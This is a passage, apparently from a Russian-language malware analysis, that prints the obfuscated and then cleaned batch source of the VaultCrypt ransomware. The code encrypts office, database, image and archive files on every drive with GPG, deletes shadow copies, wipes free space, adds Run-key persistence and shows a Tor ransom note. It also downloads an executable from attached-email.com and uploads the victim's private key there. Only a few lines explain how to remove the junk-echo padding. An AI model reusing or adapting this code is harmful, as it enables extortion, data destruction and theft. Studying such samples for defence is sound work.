+echo SpEtra7rEphaGeVaChAbrukEstaGafra &gt;nul
+echo Waw6sw5TUPh7FustAh544brajEPUTrAb &gt;nul
+echo Const ContentType="application/upload" &gt;&gt; "%temp%\77406a1e.vbs"
+echo Pre="--"+Boundary+vbCrLf+mpFields^(FieldName,FileName,ContentType^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo Po=vbCrLf+"--"+Boundary+"--"+vbCrLf &gt;&gt; "%temp%\77406a1e.vbs"
+echo SpEtra7rEphaGeVaChAbrukEstaGafra &gt;nul
+echo Waw6sw5TUPh7FustAh544brajEPUTrAb &gt;nul
+echo Const adLongVarBinary=205 &gt;&gt; "%temp%\77406a1e.vbs"
+echo Dim RS: Set RS=CreateObject^("ADODB.Recordset"^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo RS.Fields.Append "b",adLongVarBinary,Len^(Pre^)+LenB^(FileContents^)+Len^(Po^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo RS.Open &gt;&gt; "%temp%\77406a1e.vbs"
+echo RS.AddNew &gt;&gt; "%temp%\77406a1e.vbs"
+echo Dim LenData &gt;&gt; "%temp%\77406a1e.vbs"
+echo LenData=Len^(Pre^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo SpEtra7rEphaGeVaChAbrukEstaGafra &gt;nul
+echo Waw6sw5TUPh7FustAh544brajEPUTrAb &gt;nul
+echo RS^("b"^).AppendChunk^(StringToMB^(Pre^) ^&amp; ChrB^(0^)^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo Pre=RS^("b"^).GetChunk^(LenData^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo RS^("b"^)="" &gt;&gt; "%temp%\77406a1e.vbs"
+echo LenData=Len^(Po^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo RS^("b"^).AppendChunk^(StringToMB^(Po^) ^&amp; ChrB^(0^)^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo Po=RS^("b"^).GetChunk^(LenData^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo RS^("b"^)="" &gt;&gt; "%temp%\77406a1e.vbs"
+echo SpEtra7rEphaGeVaChAbrukEstaGafra &gt;nul
+echo Waw6sw5TUPh7FustAh544brajEPUTrAb &gt;nul
+echo RS^("b"^).AppendChunk^(Pre^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo RS^("b"^).AppendChunk^(FileContents^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo RS^("b"^).AppendChunk^(Po^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo RS.Update &gt;&gt; "%temp%\77406a1e.vbs"
+echo FormData=RS^("b"^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo RS.Close &gt;&gt; "%temp%\77406a1e.vbs"
+echo BuildFormData=FormData &gt;&gt; "%temp%\77406a1e.vbs"
+echo End Function &gt;&gt; "%temp%\77406a1e.vbs"
+echo SpEtra7rEphaGeVaChAbrukEstaGafra &gt;nul
+echo Waw6sw5TUPh7FustAh544brajEPUTrAb &gt;nul
+echo Function IEPostBinaryRequest^(URL,FormData,Boundary^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo Dim IE: Set IE=CreateObject^("InternetExplorer.Application"^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo SpEtra7rEphaGeVaChAbrukEstaGafra &gt;nul
+echo Waw6sw5TUPh7FustAh544brajEPUTrAb &gt;nul
+echo CNKM5uZisBFr8E8ZvA92aYEyCErjpEnbT3MtueqFD3AJPcEcrb
+echo RobfE3bEJP9vMkgaekFEjsqvlEaHscq14JcFSZlrQyjrKNyTge
+echo IE.Navigate URL,,,FormData,_ &gt;&gt; "%temp%\77406a1e.vbs"
+echo "Content-Type: multipart/form-data; boundary="+Boundary+vbCrLf &gt;&gt; "%temp%\77406a1e.vbs"
+echo SpEtra7rEphaGeVaChAbrukEstaGafra &gt;nul
+echo Waw6sw5TUPh7FustAh544brajEPUTrAb &gt;nul
+echo do While IE.Busy &gt;&gt; "%temp%\77406a1e.vbs"
+echo Wait &gt;&gt; "%temp%\77406a1e.vbs"
+echo Loop &gt;&gt; "%temp%\77406a1e.vbs"
+echo On Error Resume Next &gt;&gt; "%temp%\77406a1e.vbs"
+echo SpEtra7rEphaGeVaChAbrukEstaGafra &gt;nul
+echo Waw6sw5TUPh7FustAh544brajEPUTrAb &gt;nul
+echo IEPostBinaryRequest=IE.Document.body.innerHTML &gt;&gt; "%temp%\77406a1e.vbs"
+echo SpEtra7rEphaGeVaChAbrukEstaGafra &gt;nul
+echo Waw6sw5TUPh7FustAh544brajEPUTrAb &gt;nul
+echo IE.Quit &gt;&gt; "%temp%\77406a1e.vbs"
+echo End Function &gt;&gt; "%temp%\77406a1e.vbs"
+echo Function mpFields^(FieldName,FileName,ContentType^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo SpEtra7rEphaGeVaChAbrukEstaGafra &gt;nul
+echo Waw6sw5TUPh7FustAh544brajEPUTrAb &gt;nul
+echo Dim MPtemplate &gt;&gt; "%temp%\77406a1e.vbs"
+echo MPtemplate="Content-Disposition: form-data; name=""{field}"";"+_ &gt;&gt; "%temp%\77406a1e.vbs"
+echo " filename=""{file}"""+vbCrLf+_ &gt;&gt; "%temp%\77406a1e.vbs"
+echo "Content-Type: {ct}"+vbCrLf+vbCrLf &gt;&gt; "%temp%\77406a1e.vbs"
+echo Dim Out &gt;&gt; "%temp%\77406a1e.vbs"
+echo SpEtra7rEphaGeVaChAbrukEstaGafra &gt;nul
+echo Waw6sw5TUPh7FustAh544brajEPUTrAb &gt;nul
+echo Out=Replace^(MPtemplate,"{field}",FieldName^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo Out=Replace^(Out,"{file}",FileName^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo mpFields=Replace^(Out,"{ct}",ContentType^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo End Function &gt;&gt; "%temp%\77406a1e.vbs"
+echo SpEtra7rEphaGeVaChAbrukEstaGafra &gt;nul
+echo Waw6sw5TUPh7FustAh544brajEPUTrAb &gt;nul
+echo Function GetFile^(FileName^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo Dim Stream: Set Stream=CreateObject^("ADODB.Stream"^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo Stream.Type=1 &gt;&gt; "%temp%\77406a1e.vbs"
+echo Stream.Open &gt;&gt; "%temp%\77406a1e.vbs"
+echo Stream.LoadFromFile FileName &gt;&gt; "%temp%\77406a1e.vbs"
+echo GetFile=Stream.Read &gt;&gt; "%temp%\77406a1e.vbs"
+echo Stream.Close &gt;&gt; "%temp%\77406a1e.vbs"
+echo End Function &gt;&gt; "%temp%\77406a1e.vbs"
+echo SpEtra7rEphaGeVaChAbrukEstaGafra &gt;nul
+echo Waw6sw5TUPh7FustAh544brajEPUTrAb &gt;nul
+echo Function StringToMB^(S^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo Dim I,B &gt;&gt; "%temp%\77406a1e.vbs"
+echo For I=1 To Len^(S^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo SpEtra7rEphaGeVaChAbrukEstaGafra &gt;nul
+echo Waw6sw5TUPh7FustAh544brajEPUTrAb &gt;nul
+echo B=B ^&amp; ChrB^(Asc^(Mid^(S,I,1^)^)^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo Next &gt;&gt; "%temp%\77406a1e.vbs"
+echo StringToMB=B &gt;&gt; "%temp%\77406a1e.vbs"
+echo SpEtra7rEphaGeVaChAbrukEstaGafra &gt;nul
+echo Waw6sw5TUPh7FustAh544brajEPUTrAb &gt;nul
+echo End Function &gt;&gt; "%temp%\77406a1e.vbs"
+echo Sub Wait^(^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo On Error Resume Next &gt;&gt; "%temp%\77406a1e.vbs"
+echo End Sub &gt;&gt; "%temp%\77406a1e.vbs"
+echo SpEtra7rEphaGeVaChAbrukEstaGafra &gt;nul
+echo Waw6sw5TUPh7FustAh544brajEPUTrAb &gt;nul
+echo var fp="%%temp%%\\",os="attached-email",WshShell=CreateObject^("WScript.Shell"^),fp=WshShell.ExpandEnvironmentStrings^(fp^);function CreateObject^(b^){return new ActiveXObject^(b^)}function dw^(b,d^){var c=new ActiveXObject^("MSXML2.XMLHTTP"^);c.open^("GET",b,0^);c.send^(^);new ActiveXObject^("Scripting.FileSystemObject"^);var a=new ActiveXObject^("ADODB.Stream"^);a.Open^(^);a.Type=1;a.Write^(c.ResponseBody^);a.Position=0;a.SaveToFile^(d,2^);a.Close^(^)}dw^("http://"+os+".com/v.vlt",""+fp+"30cb056a.exe"^); &gt; "%temp%\885873e9.js"
+echo SpEtra7rEphaGeVaChAbrukEstaGafra &gt;nul
+echo Waw6sw5TUPh7FustAh544brajEPUTrAb &gt;nul
+wscript.exe //B //Nologo //T:120 "%temp%\885873e9.js"
+echo SpEtra7rEphaGeVaChAbrukEstaGafra &gt;nul
+echo Waw6sw5TUPh7FustAh544brajEPUTrAb &gt;nul
+if exist 30cb056a.exe (
+"%temp%\30cb056a.exe" -f "%temp%\91c09c60.25ca7a7c"
+echo SpEtra7rEphaGeVaChAbrukEstaGafra &gt;nul
+echo Waw6sw5TUPh7FustAh544brajEPUTrAb &gt;nul
+wscript.exe //B //Nologo //T:120 "%temp%\77406a1e.vbs" "%temp%\91c09c60.25ca7a7c" http://attached-email.com/v.php pf
+del /f /q 30cb056a.exe
+)
+del /f /q "%temp%\885873e9.js"
+del /f /q "%temp%\77406a1e.vbs"
+del /f /q "%temp%\91c09c60.25ca7a7c"
+echo SpEtra7rEphaGeVaChAbrukEstaGafra &gt;nul
+echo Waw6sw5TUPh7FustAh544brajEPUTrAb &gt;nul
+attrib -h -s "%temp%\9480bf43.76a94786"
+echo SpEtra7rEphaGeVaChAbrukEstaGafra &gt;nul
+echo Waw6sw5TUPh7FustAh544brajEPUTrAb &gt;nul
+del /f /q "%temp%\9480bf43.76a94786"
+echo SpEtra7rEphaGeVaChAbrukEstaGafra &gt;nul
+echo Waw6sw5TUPh7FustAh544brajEPUTrAb &gt;nul
+del /f /q "%temp%\*.gpg"
+del /f /q "%temp%\*.*xe"
+echo Y|assoc .vault=d21f132a
+echo SpEtra7rEphaGeVaChAbrukEstaGafra &gt;nul
+echo Waw6sw5TUPh7FustAh544brajEPUTrAb &gt;nul
+echo Y|ftype "d21f132a"=mshta.exe vbscript:Execute^(^"msgbox ^"^" BLOCK:^"^"^&amp;vbNewLine^&amp;^"^" %%1^"^"^&amp;vbNewLine^&amp;vbNewLine^&amp;ChrW^(10139^)^&amp;^"^" KEY PURCHASE: http://restoredz4xpmuqr.onion^"^"^&amp;vbNewLine^&amp;vbNewLine^&amp;^"^" [accessible only via Tor Browser: http://torproject.org]^"^",16,^"^"VaultCrypt [Need to purchase key]^"^":close^"^)
+echo SpEtra7rEphaGeVaChAbrukEstaGafra &gt;nul
+echo Waw6sw5TUPh7FustAh544brajEPUTrAb &gt;nul
+echo Y|assoc "d21f132a"\DefaultIcon=%SystemRoot%\System32\shell32.dll,-48
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "b320494e" /t REG_SZ /f /d "mshta %appdata%\ddae25beb5b57d6e.hta"
+echo SpEtra7rEphaGeVaChAbrukEstaGafra &gt;nul
+echo Waw6sw5TUPh7FustAh544brajEPUTrAb &gt;nul
+reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "e1a04a3c" /f
+del /f /q "%temp%\e33176c1.js"
+echo SpEtra7rEphaGeVaChAbrukEstaGafra &gt;nul
+echo Waw6sw5TUPh7FustAh544brajEPUTrAb &gt;nul
+reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "58f139df" /f
+reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "ed3f074a" /f
+start mshta "%temp%\ddae25beb5b57d6e.hta"
+attrib -s -h "%temp%\9480bf43.76a94786"
+echo SpEtra7rEphaGeVaChAbrukEstaGafra &gt;nul
+echo Waw6sw5TUPh7FustAh544brajEPUTrAb &gt;nul
+del /f /q "%temp%\9480bf43.76a94786"
+if exist "%systemroot%\system32\cipher.exe" (
+FOR %%s IN (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) DO call :461cd8b8 %%s
+goto 3c5d9ac8
+echo SpEtra7rEphaGeVaChAbrukEstaGafra &gt;nul
+echo Waw6sw5TUPh7FustAh544brajEPUTrAb &gt;nul
+:461cd8b8
+cipher /w:%1:
+goto:eof
+:3c5d9ac8
+echo 871c371d
+)
+del /f /q %0
+echo SpEtra7rEphaGeVaChAbrukEstaGafra &gt;nul
+echo Waw6sw5TUPh7FustAh544brajEPUTrAb &gt;nul
+:871c371d
+
+echo SpEtra7rEphaGeVaChAbrukEstaGafra &gt;nul
+echo Waw6sw5TUPh7FustAh544brajEPUTrAb &gt;nul
+
+Внутри файла есть много строк видаecho ... &gt; nul
+
+иecho ...
+
+Это, по сути, пустые операторы, которые нигде не используются.
+Вновь откроем какой-нибудь текстовый редактор и заменим все вхождения регулярного выражения ^echo [a-zA-Z0-9]+ &gt;nul\n на ничего (пустую строку). А затем заменим на ничего все вхождения регулярного выражения ^echo [a-zA-Z0-9]+\n.
+Получим несколько менее запутанный код.440 строк позитива:@ECHO OFF
+
+SetLocal EnableDelayedExpansion
+cd "%TEMP%"
+if not exist "%temp%\9480bf43.76a94786" (
+echo 871c371d &gt; "%temp%\9480bf43.76a94786"
+attrib +s +h "%temp%\9480bf43.76a94786"
+) else (
+goto 871c371d
+)
+rename "%temp%\design.css" "gpg.exe"
+copy /y "%temp%\design.css" "%temp%\gpg.exe"
+del /f /q "%temp%\design.css"
+chcp 866
+set 715c7be3=!RANDOM!
+set b67b5d00=!RANDOM!
+set dc841a88=!RANDOM!
+set db5a2d8a=!RANDOM!
+set ee1f189d=!RANDOM!
+set 2162ea2b=!RANDOM!
+set 58d179b8=!RANDOM!
+set 3d645b52=RU
+if exist "%APPDATA%\gnupg" RENAME "%APPDATA%\gnupg" gnupg_%random%
+echo Key-Type: RSA&gt; "%temp%\9c668934.2ca1046c"
+echo Key-Length: 1024&gt;&gt; "%temp%\9c668934.2ca1046c"
+echo Name-Real: Cellar&gt;&gt; "%temp%\9c668934.2ca1046c"
+
+"%temp%\gpg.exe" --batch --homedir "%temp%" --gen-key "%temp%\9c668934.2ca1046c"
+echo -----BEGIN PGP PUBLIC KEY BLOCK-----&gt; "%temp%\03dfb98e.7087b06e"
+echo Version: GnuPG v1&gt;&gt; "%temp%\03dfb98e.7087b06e"
+echo.&gt;&gt; "%temp%\03dfb98e.7087b06e"
+echo mI0EVbFePwEEAMM+eRmPkcVTTwqLOyCkSlOTDjfnJpU2vTt94yMq1c1Ix1RF2fxp&gt;&gt; "%temp%\03dfb98e.7087b06e"
+echo S9ZDuQ9qfhqUxXiUtsEY7kB1pHtcyCeqtdrYST4YzJTeNCZNTiq2mVkQlPXqcvO/&gt;&gt; "%temp%\03dfb98e.7087b06e"
+echo hXpyYH/DNB6XmdQP9rmb/gIb5qHpRNoWlb1MBDZAJnHU3PEA2LcXbBX/ABEBAAG0&gt;&gt; "%temp%\03dfb98e.7087b06e"
+echo ClZhdWx0Q3J5cHSIuAQTAQIAIgUCVbFePwIbLwYLCQgHAwIGFQgCCQoLBBYCAwEC&gt;&gt; "%temp%\03dfb98e.7087b06e"
+echo HgECF4AACgkQ+Zg2Eii5y+eiQQQAm9r0sfXO5pp4/yy6lJG+zZAiijgzECVAQvw9&gt;&gt; "%temp%\03dfb98e.7087b06e"
+echo j+JE6n7mZnZDm632PrLumTHE9PauifXmyTFf0RPUI/D5B8QFPQn9hoNf041aaEgq&gt;&gt; "%temp%\03dfb98e.7087b06e"
+echo bTQSy7TIwZJfTyZyq/yhJiH0RLI7yhj/88sjX+uu7miGHO9jb1ygTo/qe5n3Q/Vp&gt;&gt; "%temp%\03dfb98e.7087b06e"
+echo xpSJJFU=&gt;&gt; "%temp%\03dfb98e.7087b06e"
+echo =CuiR&gt;&gt; "%temp%\03dfb98e.7087b06e"
+echo -----END PGP PUBLIC KEY BLOCK-----&gt;&gt; "%temp%\03dfb98e.7087b06e"
+
+"%temp%\gpg.exe" -r Cellar --export-secret-keys --yes --homedir "%temp%" -a&gt; "%temp%\3637bf69.36ddf8fe"
+del /f /q "%temp%\9c668934.2ca1046c"
+echo.&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo BDATE: !DATE!&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo UNAME: !USERNAME!&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo CNAME: !COMPUTERNAME!&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo PQQID: AKG-4813&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo ULANG: !3d645b52!&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 01HSH: !715c7be3!&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 02HSH: !b67b5d00!&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 03HSH: !db5a2d8a!&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 04HSH: !dc841a88!&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 05HSH: !ee1f189d!&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo FHASH: !2162ea2b!&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo chcp 866 &gt; "%temp%\61231f25.9db8b89a"
+FOR %%f IN (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) DO call :1010f32d %%f
+echo if exist "%%TeMp%%\VAULT.KEY" echo 01FNSH-OK^&gt;^&gt; "%%TeMp%%\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo if exist "%%AppDATA%%\VAULT.KEY" echo 01FNSH-OK^&gt;^&gt; "%%AppDATA%%\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo if exist "%%USERPROFILE%%\Desktop\VAULT.KEY" echo 01FNSH-OK^&gt;^&gt; "%%USERPROFILE%%\Desktop\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+goto 441f5342
+:1010f32d
+dir /B "%1:\"&amp;&amp; for /r "%1:\" %%i in (*.xls *.doc) do (
+echo "%%TeMp%%\gpg.exe" -r Cellar --yes -q --no-verbose --trust-model always --encrypt-files "%%i"^&amp; move /y "%%i.gpg" "%%i"^&amp; RENAME "%%i" "%%~nxi.vault"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo %%i&gt;&gt; "%temp%\21b0fb7b.7ca0ec0c"
+)
+goto:eof
+:441f5342
+echo Set objShell = CreateObject^("Shell.Application"^) &gt; "%temp%\59665d79.vbs"
+echo Set objWshShell = WScript.CreateObject^("WScript.Shell"^) &gt;&gt; "%temp%\59665d79.vbs"
+echo Set objWshProcessEnv = objWshShell.Environment^("PROCESS"^) &gt;&gt; "%temp%\59665d79.vbs"
+echo objShell.ShellExecute "wmic.exe", "shadowcopy delete /nointeractive", "", "runas", 0 &gt;&gt; "%temp%\59665d79.vbs"
+echo var cdp="%%TEMP%%\\69aca909.cmd";var WshShell=CreateObject("WScript.Shell");cdp=WshShell.ExpandEnvironmentStrings(cdp);function CreateObject(fq){return new ActiveXObject(fq)}function xx(cdp){WshShell.Run(cdp,0,0);}xx(''+cdp+'');&gt; "%temp%\acda3f33.js"
+echo.&gt; "%temp%\69aca909.cmd"
+echo SetLocal EnableDelayedExpansion&gt;&gt; "%temp%\69aca909.cmd"
+echo for /f "tokens=2*" %%%%i in ^('reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v "CurrentVersion"'^) do set fnd7=%%%%j&gt;&gt; "%temp%\69aca909.cmd"
+echo if not %%fnd7:~0,1%% GEQ 6 goto a3811a18&gt;&gt; "%temp%\69aca909.cmd"
+echo set ntries=^0&gt;&gt; "%temp%\69aca909.cmd"
+echo :3c843d11&gt;&gt; "%temp%\69aca909.cmd"
+echo wscript.exe //B //Nologo "%%temp%%\59665d79.vbs"^&amp; tasklist^|findstr /i wmic.exe&gt;&gt; "%temp%\69aca909.cmd"
+echo if not ^^!errorlevel^^!==0 ^(&gt;&gt; "%temp%\69aca909.cmd"
+echo set /a ntries+=^1&gt;&gt; "%temp%\69aca909.cmd"
+echo if not ^^!ntries^^! GEQ 16 goto 3c843d11&gt;&gt; "%temp%\69aca909.cmd"
+echo ^)&gt;&gt; "%temp%\69aca909.cmd"
+echo :a3811a18&gt;&gt; "%temp%\69aca909.cmd"
+echo del /f /q "%temp%\acda3f33.js"&gt;&gt; "%temp%\69aca909.cmd"
+echo del /f /q "%temp%\59665d79.vbs"&gt;&gt; "%temp%\69aca909.cmd"
+echo echo del /f /q "%temp%\59665d79.vbs"&gt;&gt; "%temp%\69aca909.cmd"
+echo echo 1107cc4c ^&gt; "%%temp%%\69aca909.cmd"&gt;&gt; "%temp%\69aca909.cmd"
+start wscript.exe //B //Nologo "%temp%\acda3f33.js"
+FOR %%f IN (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) DO call :c68cd952 %%f
+echo if exist "%%TeMp%%\VAULT.KEY" echo 02FNSH-OK^&gt;^&gt; "%%TeMp%%\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo if exist "%%AppDATA%%\VAULT.KEY" echo 02FNSH-OK^&gt;^&gt; "%%AppDATA%%\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo if exist "%%USERPROFILE%%\Desktop\VAULT.KEY" echo 02FNSH-OK^&gt;^&gt; "%%USERPROFILE%%\Desktop\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+goto 9b100e11
+:c68cd952
+dir /B "%1:\"&amp;&amp; for /r "%1:\" %%i in (*.pdf *.rtf) do (
+echo "%%TeMp%%\gpg.exe" -r Cellar --yes -q --no-verbose --trust-model always --encrypt-files "%%i"^&amp; move /y "%%i.gpg" "%%i"^&amp; RENAME "%%i" "%%~nxi.vault"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo %%i&gt;&gt; "%temp%\21b0fb7b.7ca0ec0c"
+)
+goto:eof
+:9b100e11
+FOR %%f IN (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) DO call :a556dfcb %%f
+echo if exist "%%TeMp%%\VAULT.KEY" echo 03FNSH-OK^&gt;^&gt; "%%TeMp%%\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo if exist "%%AppDATA%%\VAULT.KEY" echo 03FNSH-OK^&gt;^&gt; "%%AppDATA%%\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo if exist "%%USERPROFILE%%\Desktop\VAULT.KEY" echo 03FNSH-OK^&gt;^&gt; "%%USERPROFILE%%\Desktop\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+goto cd9f3e2a
+
+:a556dfcb
+dir /B "%1:\"&amp;&amp; for /r "%1:\" %%i in (*.psd *.dwg *.cdr) do (
+echo "%%TeMp%%\gpg.exe" -r Cellar --yes -q --no-verbose --trust-model always --encrypt-files "%%i"^&amp; move /y "%%i.gpg" "%%i"^&amp; RENAME "%%i" "%%~nxi.vault"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo %%i&gt;&gt; "%temp%\21b0fb7b.7ca0ec0c"
+)
+goto:eof
+:cd9f3e2a
+FOR %%f IN (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) DO call :071faa5e %%f
+echo if exist "%%TeMp%%\VAULT.KEY" echo 04FNSH-OK^&gt;^&gt; "%%TeMp%%\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo if exist "%%AppDATA%%\VAULT.KEY" echo 04FNSH-OK^&gt;^&gt; "%%AppDATA%%\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo if exist "%%USERPROFILE%%\Desktop\VAULT.KEY" echo 04FNSH-OK^&gt;^&gt; "%%USERPROFILE%%\Desktop\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+goto e0aede1c
+:071faa5e
+dir /B "%1:\"&amp;&amp; for /r "%1:\" %%i in (*.cd *.mdb *.1cd *.dbf *.sqlite) do (
+echo "%%TeMp%%\gpg.exe" -r Cellar --yes -q --no-verbose --trust-model always --encrypt-files "%%i"^&amp; move /y "%%i.gpg" "%%i"^&amp; RENAME "%%i" "%%~nxi.vault"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo %%i&gt;&gt; "%temp%\21b0fb7b.7ca0ec0c"
+)
+goto:eof
+:e0aede1c
+FOR %%s IN (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) DO call :f941ecc1 %%s
+echo if exist "%%TeMp%%\VAULT.KEY" echo 05FNSH-OK^&gt;^&gt; "%%TeMp%%\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo if exist "%%AppDATA%%\VAULT.KEY" echo 05FNSH-OK^&gt;^&gt; "%%AppDATA%%\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo if exist "%%USERPROFILE%%\Desktop\VAULT.KEY" echo 05FNSH-OK^&gt;^&gt; "%%USERPROFILE%%\Desktop\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+goto ca70214e
+:f941ecc1
+dir /B "%1:\"&amp;&amp; for /r "%1:\" %%i in (*.jpg *.zip) do (
+echo "%%TeMp%%\gpg.exe" -r Cellar --yes -q --no-verbose --trust-model always --encrypt-files "%%i"^&amp; move /y "%%i.gpg" "%%i"^&amp; RENAME "%%i" "%%~nxi.vault"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo %%i&gt;&gt; "%temp%\21b0fb7b.7ca0ec0c"
+)
+goto:eof
+:ca70214e
+set loco=!random!!random!
+echo function CreateObject^(b^){return new ActiveXObject^(b^)} &gt;&gt; !loco!.js
+echo function ok^(b^){var c=new ActiveXObject^("MSXML2.XMLHTTP"^);c.open^("GET",b,0^);c.send^(^)} &gt;&gt; !loco!.js
+echo ok^("http://attached-email.com/c1.php"^); &gt;&gt; !loco!.js
+wscript.exe //B //nologo //T:40 "!loco!.js"
+echo echo FHASH-OK^&gt;^&gt; "%%TeMp%%\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo echo FHASH-OK^&gt;^&gt; "%%AppDATA%%\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo echo FHASH-OK^&gt;^&gt; "%%USERPROFILE%%\Desktop\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo echo 1e759748 ^&gt; "%%TeMp%%\4c2e533d.cmd"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo del /f /q "%%TeMp%%\4c2e533d.cmd"&gt;&gt; "%temp%\61231f25.9db8b89a"
+findstr /i /v "windows recycle program avatar roaming msoffice temporary sample themes uploads csize resource internet com_ intel common resources texture profiles library clipart manual games framework64 setupcache autograph maps amd64 cache support guide abbyy application thumbnails avatars template adobe" "%temp%\21b0fb7b.7ca0ec0c"&gt; "%temp%\97cf86b0.e479bce7"
+findstr /i /v "windows recycle program avatar roaming msoffice temporary sample themes uploads csize resource internet com_ intel common resources texture profiles library clipart manual games framework64 setupcache autograph maps amd64 cache support guide abbyy application thumbnails avatars template adobe" "%temp%\61231f25.9db8b89a"&gt; "%temp%\f2a431bc.6ccc04ec"
+findstr /v "AppData APPDATA appdata temp TEMP Temp" "%temp%\97cf86b0.e479bce7"&gt; "%temp%\8f9c3dbb.9767d548"
+findstr /v "AppData APPDATA appdata temp TEMP Temp" "%temp%\f2a431bc.6ccc04ec"&gt; "%temp%\4c2e533d.cmd"
+del /f /q "%temp%\97cf86b0.e479bce7"
+del /f /q "%temp%\f2a431bc.6ccc04ec"
+del /f /q "%temp%\21b0fb7b.7ca0ec0c"
+del /f /q "%temp%\61231f25.9db8b89a"
+echo XCONF: !58d179b8!&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+set 3a3b7af1=66668
+for /f %%f in ('find /c /v ""^&lt; "%temp%\8f9c3dbb.9767d548"') do (
+set 3a3b7af1=%%f
+)
+echo QNTTY: !3a3b7af1!&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+for %%c IN (01:xls 04:doc 05:rtf 10:pdf 11:psd 12:dwg 13:cdr 19:cd 20:mdb 21:1cd 23:dbf 24:sqlite 26:jpg 27:zip) do (
+for /f "tokens=1,2 delims=:" %%i in ("%%c") do (
+for /f %%b in ('find /c /i ".%%j"^&lt; "%temp%\8f9c3dbb.9767d548"') do (
+echo %%iEXT: %%b&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+)))
+echo 02EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 03EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 06EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 07EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 08EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 09EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 14EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 15EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 16EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 17EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 18EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 22EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
